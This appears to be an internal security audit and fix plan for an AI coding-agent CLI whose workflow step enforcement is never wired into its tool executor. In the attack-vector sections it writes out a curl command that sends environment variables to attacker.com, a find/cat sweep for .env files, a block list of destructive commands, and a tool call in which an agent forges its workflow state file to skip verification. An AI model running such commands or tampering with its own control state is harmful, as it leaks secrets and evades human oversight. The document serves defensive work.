# 🔒 SECURITY AUDIT: Workflow Enforcement Bypass Vulnerability

**Classification:** CRITICAL  
**Status:** VULNERABILITY CONFIRMED  
**Discovery Date:** 2026-03-27  
**Affected System:** Shark Frankenstein CLI - Workflow Enforcement Layer  

---

## 📋 EXECUTIVE SUMMARY

The Shark Frankenstein CLI has a **critical architectural gap** where the Workflow State Machine (`state-machine.ts`) is not integrated with the Tool Executor (`executor.ts`). This allows AI agents to bypass workflow step restrictions during file operations.

**Impact:** Agents can write files during PLAN step (should only write to `.shark/`), skip BUILD step validation, and potentially ship unverified code.

---

## 🎯 VULNERABILITY #1: Workflow-ToolExecutor Disconnect

### Current Architecture (BROKEN)

```
┌─────────────────────────────────────────────────────────────────────┐
│                        EXECUTION FLOW (CURRENT)                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Agent (GLM/Gemma)                                                   │
│       │                                                              │
│       ▼                                                              │
│  ToolExecutor.executeTool()                                          │
│       │                                                              │
│       ├─► executeWriteFile()                                         │
│       │        │                                                     │
│       │        ├─► ✅ Guardian.checkPermission()  ← ENFORCED         │
│       │        │                                                     │
│       │        └─► ❌ WorkflowBlocker.blockWrite() ← NEVER CALLED    │
│       │                                                              │
│       └─► executeRunCommand()                                        │
│                │                                                     │
│                └─► ⚠️  Only basic dangerous pattern check            │
│                                                                      │
│  BYPASS: Agent can write to src/ during PLAN step                   │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Evidence

**File:** `src/tools/executor.ts:93-142`

```typescript
// executeWriteFile() - Line 93
private async executeWriteFile(toolCall: ToolCall): Promise<ToolResult> {
  const filePath = this.resolvePath(toolCall.arguments.file_path as string);
  const content = toolCall.arguments.content as string;

  // Guardian check - WORKS
  const decision = this.guardian.checkPermission(filePath, 'write');
  
  // ❌ MISSING: WorkflowBlocker.blockWrite(filePath)
  // This allows writing to src/ during PLAN step
  
  if (decision === ModificationDecision.DENY) {
    return { ... blocked ... };
  }
  // ... proceed to write
}
```

**File:** `src/workflow/blocker.ts:115-135` (EXISTS BUT NEVER CALLED)

```typescript
// WorkflowBlocker.blockWrite() - EXISTS BUT NEVER INTEGRATED
blockWrite(filePath: string): { blocked: boolean; reason?: string } {
  const state = this.machine.getState();

  // During PLAN step, only allow .shark/ writes
  if (state.currentStep === WorkflowStep.PLAN) {
    if (!filePath.includes('.shark/')) {
      return {
        blocked: true,
        reason: 'During PLAN step, can only write to .shark/ directory',
      };
    }
  }

  // During BUILD step, allow src/ and .shark/ writes
  if (state.currentStep === WorkflowStep.BUILD) {
    if (!filePath.includes('src/') && !filePath.includes('.shark/')) {
      return {
        blocked: true,
        reason: 'During BUILD step, can only write to src/ and .shark/',
      };
    }
  }

  return { blocked: false };
}
```

### Attack Vector

```typescript
// Attacker (AI Agent) in PLAN step (should only write to .shark/)
// Uses GLM's write_file tool directly:

{
  "name": "write_file",
  "arguments": {
    "file_path": "src/malicious-code.ts",  // ❌ Should be blocked
    "content": "// Bypassed workflow validation"
  }
}

// Current behavior: File is written (Guardian allows src/ in BALANCED mode)
// Expected behavior: Should be blocked - not in BUILD step yet
```

---

## 🎯 VULNERABILITY #2: Command Execution Insufficiently Restricted

### Current State

**File:** `src/tools/executor.ts:195-245`

```typescript
// executeRunCommand() - Only checks for obvious dangerous patterns
private async executeRunCommand(toolCall: ToolCall): Promise<ToolResult> {
  const command = toolCall.arguments.command as string;
  
  // Only blocks: rm -rf /, mkfs, dd if=, fork bombs
  const dangerousPatterns = [
    /rm\s+-rf\s+\//,
    />\s*\/dev\/sda/,
    /mkfs/,
    /dd\s+if=/,
    /:(){ :|:& };:/,
  ];
  
  // ❌ Missing: Workflow step validation
  // ❌ Missing: Network exfiltration prevention
  // ❌ Missing: Git operation restrictions during certain steps
}
```

### Attack Vectors

1. **Git Operations During PLAN Step:**
   ```bash
   git push origin main  # Should be blocked until SHIP step
   git reset --hard HEAD~1  # Should require VERIFY step
   ```

2. **Environment Variable Exfiltration:**
   ```bash
   curl https://attacker.com/steal?data=$(env | base64)
   ```

3. **File System Enumeration:**
   ```bash
   find / -name "*.env" -exec cat {} \;
   ```

---

## 🎯 VULNERABILITY #3: No Workflow State in Tool Execution Context

### Problem

The `ToolExecutor` has no knowledge of the current workflow step. It operates in isolation.

```typescript
// ToolExecutor constructor - Line 39-43
constructor(config: ToolExecutorConfig) {
  this.guardian = config.guardian;      // ✅ Has Guardian
  this.workspacePath = config.workspacePath;
  this.verbose = config.verbose;
  // ❌ No workflowMachine reference
  // ❌ No workflowBlocker reference
}
```

### Impact

- Tool executor cannot enforce step-specific restrictions
- Each tool operates without workflow context
- Step transitions not validated during tool execution

---

## 🎯 VULNERABILITY #4: State Machine Bypass via Direct File Manipulation

### Problem

The workflow state is stored in `.shark/workflow.json` which can be modified by agents.

**File:** `src/workflow/state-machine.ts:98-104`

```typescript
// State saved to disk as plain JSON
private saveState(): void {
  const dir = path.dirname(this.statePath);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
  fs.writeFileSync(this.statePath, JSON.stringify(this.state, null, 2));
  // ❌ No integrity check (checksum/signature)
  // ❌ No tamper detection
}
```

### Attack Vector

```typescript
// Agent modifies workflow state directly
{
  "name": "write_file",
  "arguments": {
    "file_path": ".shark/workflow.json",
    "content": "{\"currentStep\": 5, \"verification\": {\"allPassed\": true}}"
  }
}
```

**Note:** Guardian should protect `.shark/` but this needs verification.

---

## 🎯 VULNERABILITY #5: Missing Integration Points

### Locations Where Workflow Should Be Checked But Isn't

| Location | File | Line | Missing Check |
|----------|------|------|---------------|
| `executeWriteFile` | `executor.ts` | 93 | `WorkflowBlocker.blockWrite()` |
| `executeRunCommand` | `executor.ts` | 195 | Step-specific command restrictions |
| `executeSearch` | `executor.ts` | 250 | Read restrictions per step |
| `processToolCalls` | `coordinator-base.ts` | 119 | Pre-execution workflow check |
| `quickExecute` | `coordinator-micro.ts` | 194 | Bypasses all workflow checks |
| `quickExecute` | `coordinator-macro.ts` | 183 | Bypasses all workflow checks |

---

## 🔧 PROPOSED FIX: Layered Enforcement Architecture

### Design Principles

1. **Fail-Safe Defaults:** If workflow state unknown, DENY
2. **No Bypass Paths:** Every tool execution must go through workflow check
3. **Graceful Degradation:** If workflow corrupted, recover to PLAN step
4. **Minimal Friction:** Don't over-restrict legitimate production flows
5. **Transparent Blocking:** Clear error messages explaining why blocked

### Architecture (PROPOSED)

```
┌─────────────────────────────────────────────────────────────────────┐
│                     LAYERED ENFORCEMENT ARCHITECTURE                 │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌──────────────────────────────────────────────────────────────┐   │
│  │ Layer 4: Guardian (Zone Protection) - EXISTING               │   │
│  │   • System paths: DENY                                        │   │
│  │   • Personal paths: DENY (BALANCED mode)                      │   │
│  │   • Workspace: ALLOW (with workflow check)                    │   │
│  └──────────────────────────────────────────────────────────────┘   │
│                              │                                       │
│                              ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐   │
│  │ Layer 3: Workflow Blocker (Step Enforcement) - NEW           │   │
│  │   • PLAN: Only .shark/ writes                                 │   │
│  │   • BUILD: .shark/ + src/ writes                              │   │
│  │   • TEST: .shark/ + test-results/ writes                      │   │
│  │   • VERIFY: Read-only (except .shark/verification/)           │   │
│  │   • SHIP: Read-only (push via git hook)                       │   │
│  └──────────────────────────────────────────────────────────────┘   │
│                              │                                       │
│                              ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐   │
│  │ Layer 2: Command Restriction (Step-Specific) - NEW           │   │
│  │   • PLAN: Only read commands                                  │   │
│  │   • BUILD: npm, tsc, allowed                                  │   │
│  │   • TEST: npm test, docker allowed                            │   │
│  │   • VERIFY: Read-only commands                                │   │
│  │   • SHIP: git push (via hook only)                            │   │
│  └──────────────────────────────────────────────────────────────┘   │
│                              │                                       │
│                              ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐   │
│  │ Layer 1: State Integrity (Tamper Detection) - NEW            │   │
│  │   • Checksum verification on state load                       │   │
│  │   • Audit log of state changes                                │   │
│  │   • Auto-recovery on corruption                               │   │
│  └──────────────────────────────────────────────────────────────┘   │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 📝 IMPLEMENTATION PLAN

### Phase 1: Core Integration (Priority: P0)

**Objective:** Connect WorkflowBlocker to ToolExecutor without breaking existing flows.

#### 1.1 Create WorkflowAwareExecutor

**File:** `src/tools/workflow-aware-executor.ts` (NEW)

```typescript
/**
 * WorkflowAwareExecutor - Tool execution with workflow enforcement
 * 
 * Wraps ToolExecutor with workflow step validation.
 * All tool calls pass through workflow blocker before execution.
 */

import { ToolExecutor, ToolResult, ToolExecutorConfig } from './executor';
import { WorkflowBlocker } from '../workflow/blocker';
import { WorkflowMachine } from '../workflow/state-machine';
import { ToolCall } from '../brain/types';

export interface WorkflowAwareConfig extends ToolExecutorConfig {
  enforceWorkflow: boolean;  // Can be disabled for legacy flows
  allowQuickExecute: boolean; // Emergency bypass (requires audit log)
}

export class WorkflowAwareExecutor extends ToolExecutor {
  private workflowBlocker: WorkflowBlocker;
  private workflowMachine: WorkflowMachine;
  private enforceWorkflow: boolean;
  private auditLog: AuditEntry[] = [];

  constructor(config: WorkflowAwareConfig) {
    super(config);
    this.workflowMachine = new WorkflowMachine(config.workspacePath);
    this.workflowBlocker = new WorkflowBlocker(config.workspacePath);
    this.enforceWorkflow = config.enforceWorkflow ?? true;
  }

  async executeTool(toolCall: ToolCall): Promise<ToolResult> {
    // Layer 3: Workflow check
    if (this.enforceWorkflow) {
      const workflowResult = this.checkWorkflow(toolCall);
      if (workflowResult.blocked) {
        this.auditBlock(toolCall, workflowResult);
        return workflowResult.result;
      }
    }

    // Layer 4: Guardian check (in parent)
    return super.executeTool(toolCall);
  }

  private checkWorkflow(toolCall: ToolCall): WorkflowCheckResult {
    switch (toolCall.name) {
      case 'write_file':
        return this.checkWriteFile(toolCall.arguments.file_path);
      case 'run_command':
        return this.checkCommand(toolCall.arguments.command);
      case 'read_file':
        return this.checkReadFile(toolCall.arguments.file_path);
      default:
        return { blocked: false };
    }
  }

  private checkWriteFile(filePath: string): WorkflowCheckResult {
    const { blocked, reason } = this.workflowBlocker.blockWrite(filePath);
    
    if (blocked) {
      return {
        blocked: true,
        result: {
          toolCallId: '',
          name: 'write_file',
          success: false,
          result: `Workflow blocked: ${reason}`,
          guardianBlocked: true,
          guardianReason: reason,
        },
      };
    }
    
    return { blocked: false };
  }

  private checkCommand(command: string): WorkflowCheckResult {
    const state = this.workflowMachine.getState();
    const step = state.currentStep;
    
    // Define allowed commands per step
    const allowedCommands: Record<number, RegExp[]> = {
      1: [/^cat/, /^ls/, /^grep/, /^find/],  // PLAN: read-only
      2: [/^npm/, /^npx/, /^tsc/, /^node/, /^cat/, /^ls/],  // BUILD
      3: [/^npm/, /^npx/, /^docker/, /^cat/, /^ls/],  // TEST
      4: [/^cat/, /^ls/, /^grep/],  // VERIFY: read-only
      5: [/^git push/],  // SHIP: only via hook
    };

    const allowed = allowedCommands[step] || [];
    const isAllowed = allowed.some(pattern => pattern.test(command));
    
    if (!isAllowed && this.enforceWorkflow) {
      return {
        blocked: true,
        result: {
          toolCallId: '',
          name: 'run_command',
          success: false,
          result: `Workflow blocked: Command not allowed in step ${step}`,
          guardianBlocked: true,
          guardianReason: `Command restricted in current workflow step`,
        },
      };
    }
    
    return { blocked: false };
  }

  // ... rest of implementation
}
```

#### 1.2 Modify BaseCoordinator to Use WorkflowAwareExecutor

**File:** `src/brain/coordinator-base.ts` (MODIFY)

```typescript
// Line 23-26: Add import
import { WorkflowAwareExecutor, WorkflowAwareConfig } from '../tools/workflow-aware-executor';

// Line 89-96: Replace ToolExecutor with WorkflowAwareExecutor
protected toolExecutor: WorkflowAwareExecutor;

constructor(config: BaseCoordinatorConfig) {
  // ... existing code ...
  
  // Initialize WorkflowAware ToolExecutor
  const executorConfig: WorkflowAwareConfig = {
    guardian: this.guardian,
    workspacePath: this.workspacePath,
    verbose: this.verbose,
    enforceWorkflow: true,  // Enable by default
    allowQuickExecute: false,  // Disable quick execute bypass
  };
  this.toolExecutor = new WorkflowAwareExecutor(executorConfig);
  this.log('🔧 WorkflowAwareExecutor initialized');
}
```

#### 1.3 Add Workflow Context to Error Messages

**File:** `src/tools/workflow-aware-executor.ts` (ADD)

```typescript
private formatBlockMessage(
  toolName: string, 
  reason: string, 
  currentStep: number
): string {
  const stepNames = ['PLAN', 'BUILD', 'TEST', 'VERIFY', 'SHIP'];
  
  return `
╔═══════════════════════════════════════════════════════════════╗
║  🦈 WORKFLOW ENFORCEMENT: OPERATION BLOCKED                    ║
╠═══════════════════════════════════════════════════════════════╣
║                                                               ║
║  Current Step: ${stepNames[currentStep - 1].padEnd(46)}║
║  Attempted:    ${toolName.padEnd(46)}║
║                                                               ║
║  Reason: ${reason.slice(0, 57).padEnd(57)}║
║                                                               ║
║  To proceed:                                                  ║
║    1. Complete current step requirements                      ║
║    2. Run: shark status                                       ║
║    3. Run: shark step ${currentStep} (complete current step)             ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
`;
}
```

### Phase 2: State Integrity (Priority: P1)

#### 2.1 Add State Integrity Check

**File:** `src/workflow/state-machine.ts` (MODIFY)

```typescript
import * as crypto from 'crypto';

// Add to class
private computeStateChecksum(state: WorkflowState): string {
  const stateString = JSON.stringify({
    currentStep: state.currentStep,
    verification: state.verification.allPassed,
    timestamp: state.updatedAt,
  });
  return crypto.createHash('sha256').update(stateString).digest('hex');
}

private loadState(workspacePath: string): WorkflowState {
  if (fs.existsSync(this.statePath)) {
    try {
      const data = JSON.parse(fs.readFileSync(this.statePath, 'utf-8'));
      
      // NEW: Verify integrity
      const storedChecksum = data._checksum;
      const computedChecksum = this.computeStateChecksum(data);
      
      if (storedChecksum && storedChecksum !== computedChecksum) {
        console.error('⚠️  Workflow state tampered! Resetting to PLAN.');
        return createInitialState(workspacePath);
      }
      
      // ... rest of existing code
    } catch {
      return createInitialState(workspacePath);
    }
  }
  return createInitialState(workspacePath);
}

private saveState(): void {
  // ... existing code ...
  
  // NEW: Add integrity checksum
  this.state._checksum = this.computeStateChecksum(this.state);
  
  fs.writeFileSync(this.statePath, JSON.stringify(this.state, null, 2));
}
```

### Phase 3: Production Flow Compatibility (Priority: P1)

#### 3.1 Add Workflow Bypass Mode for Emergency

**File:** `src/cli.ts` (ADD)

```typescript
// Add --skip-workflow flag for emergency recovery
if (args.includes('--skip-workflow') || process.env.SHARK_SKIP_WORKFLOW === 'true') {
  console.log(chalk.yellow('⚠️  WARNING: Workflow enforcement disabled'));
  console.log(chalk.yellow('   This should only be used for emergency recovery'));
  cli.setEnforceWorkflow(false);
}
```

#### 3.2 Add Permissive Mode for Legitimate Bypass

**File:** `src/tools/workflow-aware-executor.ts` (ADD)

```typescript
/**
 * Permissive mode for specific scenarios:
 * - Emergency bug fixes in production
 * - Hot-patch deployment
 * - CI/CD pipelines with external verification
 */
setPermissiveMode(enabled: boolean, reason: string): void {
  this.enforceWorkflow = !enabled;
  
  if (enabled) {
    this.auditLog.push({
      timestamp: new Date(),
      action: 'permissive_mode_enabled',
      reason,
      user: process.env.USER || 'unknown',
    });
  }
}
```

### Phase 4: Testing & Verification (Priority: P0)

#### 4.1 Integration Tests

**File:** `testing/workflow-enforcement.test.ts` (NEW)

```typescript
describe('Workflow Enforcement', () => {
  describe('Layer 3: Workflow Blocker', () => {
    it('should block src/ writes during PLAN step', async () => {
      const executor = new WorkflowAwareExecutor({
        workspacePath: testWorkspace,
        guardian: testGuardian,
        enforceWorkflow: true,
      });
      
      // Set workflow to PLAN step
      setWorkflowStep(testWorkspace, WorkflowStep.PLAN);
      
      const result = await executor.executeTool({
        id: '1',
        name: 'write_file',
        arguments: {
          file_path: 'src/new-file.ts',
          content: 'test',
        },
      });
      
      expect(result.success).toBe(false);
      expect(result.guardianBlocked).toBe(true);
      expect(result.result).toContain('PLAN step');
    });
    
    it('should allow .shark/ writes during PLAN step', async () => {
      // ... test for allowed path
    });
    
    it('should allow src/ writes during BUILD step', async () => {
      // ... test for BUILD step
    });
  });
  
  describe('Layer 2: Command Restriction', () => {
    it('should block npm commands during PLAN step', async () => {
      // ... test
    });
    
    it('should allow npm commands during BUILD step', async () => {
      // ... test
    });
  });
  
  describe('State Integrity', () => {
    it('should detect tampered workflow state', async () => {
      // ... test
    });
    
    it('should reset to PLAN on corruption', async () => {
      // ... test
    });
  });
});
```

---

## 📊 RISK ASSESSMENT

### Before Fix

| Risk | Severity | Likelihood | Impact |
|------|----------|------------|--------|
| Bypass PLAN step | HIGH | HIGH | Ship unverified code |
| Write malicious code | MEDIUM | MEDIUM | Code injection |
| Skip verification | HIGH | MEDIUM | Bug deployment |
| State tampering | MEDIUM | LOW | Fake verification |

### After Fix

| Risk | Severity | Likelihood | Impact |
|------|----------|------------|--------|
| Bypass PLAN step | LOW | LOW | Blocked at executor |
| Write malicious code | LOW | LOW | Blocked at executor |
| Skip verification | LOW | LOW | Blocked at executor |
| State tampering | LOW | LOW | Checksum detection |

---

## 🚀 EXECUTION WORKFLOW

### Step 1: Preparation (Day 1)

```bash
# 1. Create feature branch
git checkout -b security/workflow-enforcement

# 2. Create test workspace
mkdir -p testing/workflow-enforcement
cd testing/workflow-enforcement
git init
```

### Step 2: Implementation (Day 1-2)

```bash
# 1. Implement WorkflowAwareExecutor
# 2. Modify BaseCoordinator
# 3. Add state integrity checks
# 4. Add bypass mode
```

### Step 3: Testing (Day 2)

```bash
# 1. Run integration tests
npm run test:workflow

# 2. Run full test suite
npm run test:all

# 3. Manual verification
./scripts/verify-workflow-enforcement.sh
```

### Step 4: Deployment (Day 3)

```bash
# 1. Code review
gh pr create --title "Security: Workflow Enforcement Integration"

# 2. CI/CD verification
# 3. Merge to main
# 4. Release new version
```

---

## 📋 CHECKLIST

### Implementation

- [ ] Create `WorkflowAwareExecutor` class
- [ ] Integrate with `BaseCoordinator`
- [ ] Add state integrity checksums
- [ ] Add permissive mode for emergencies
- [ ] Update error messages with workflow context
- [ ] Add command restrictions per step

### Testing

- [ ] Test PLAN step restrictions
- [ ] Test BUILD step restrictions
- [ ] Test TEST step restrictions
- [ ] Test VERIFY step restrictions
- [ ] Test SHIP step restrictions
- [ ] Test state tampering detection
- [ ] Test bypass mode

### Documentation

- [ ] Update API documentation
- [ ] Update user guide
- [ ] Add migration guide
- [ ] Update security documentation

### Production Readiness

- [ ] Load testing
- [ ] Performance impact assessment
- [ ] Rollback plan
- [ ] Monitoring alerts

---

## 🔐 SECURITY CONSIDERATIONS

### Defense in Depth

1. **Layer 1 (State):** Tamper detection via checksum
2. **Layer 2 (Commands):** Step-specific command restrictions
3. **Layer 3 (Files):** Step-specific path restrictions
4. **Layer 4 (Guardian):** Zone protection (existing)

### Audit Trail

All workflow blocks are logged with:
- Timestamp
- Tool name
- Attempted path/command
- Current step
- Reason for block

### Graceful Degradation

If workflow state is corrupted:
1. Log error
2. Reset to PLAN step
3. Notify user
4. Continue operation (fail-open for availability)

---

## 📞 CONTACT

**Security Team:** security@kraken.dev  
**Lead Engineer:** [Engineer #1 - Security Specialist]  
**Review Required:** Yes (security-critical change)

---

*Document Version: 1.0*  
*Last Updated: 2026-03-27*  
*Classification: INTERNAL - SECURITY SENSITIVE*
